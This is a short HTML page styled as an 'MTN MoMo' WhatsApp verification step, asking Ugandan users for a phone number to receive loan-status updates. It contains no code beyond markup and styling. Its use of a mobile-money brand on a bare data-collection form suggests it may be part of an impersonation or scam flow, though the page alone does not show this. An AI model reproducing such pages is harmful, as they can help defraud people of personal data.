<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN MoMo - WhatsApp Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #0c1b2a;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .momo-card {
            background-color: #14283b;
            border: 1px solid #1f3a52;
            border-radius: 16px;
            padding: 40px;
            width: 100%;
            max-width: 500px;
            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.4);
            text-align: center;
        }
        .badge-step {
            background-color: #ffcc00;
            color: #0c1b2a;
            font-weight: 700;
            font-size: 0.85rem;
            padding: 6px 14px;
            border-radius: 20px;
            display: inline-block;
            margin-bottom: 20px;
        }
        h2 {
            font-weight: 700;
            font-size: 1.8rem;
            margin-bottom: 12px;
            color: #ffffff;
        }
        p.subtitle {
            color: #b0c4de;
            font-size: 0.95rem;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .form-control {
            background-color: #0c1b2a;
            border: 1px solid #2d4a65;
            color: #ffffff;
            border-radius: 8px;
            padding: 14px;
            font-size: 1rem;
        }
        .form-control:focus {
            background-color: #0c1b2a;
            border-color: #ffcc00;
            color: #ffffff;
            box-shadow: 0 0 0 0.25rem rgba(255, 204, 0, 0.25);
        }
        .input-group-text {
            background-color: #1c354d;
            border: 1px solid #2d4a65;
            color: #ffcc00;
            font-weight: bold;
        }
        .btn-submit {
            background-color: #ffcc00;
            color: #0c1b2a;
            font-weight: 700;
            font-size: 1rem;
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            margin-top: 20px;
            cursor: pointer;
            transition: background-color 0.2s ease;
            text-transform: uppercase;
        }
        .btn-submit:hover {
            background-color: #e6b800;
        }
    </style>
</head>
<body>

    <div class="momo-card">
        <div class="badge-step">📱 CONTACT VERIFICATION</div>
        
        <h2>Enter Your WhatsApp Number</h2>
        <p class="subtitle">We will use this WhatsApp number to send you updates regarding your loan status.</p>
        
        <form method="POST">
            <div class="input-group mb-3">
                <span class="input-group-text">+256</span>
                <input type="tel" name="whatsapp_phone" class="form-control" placeholder="700000000" pattern="[0-9]{9,10}" required>
            </div>
            <button type="submit" class="btn-submit">Continue</button>
        </form>
    </div>

</body>
</html>
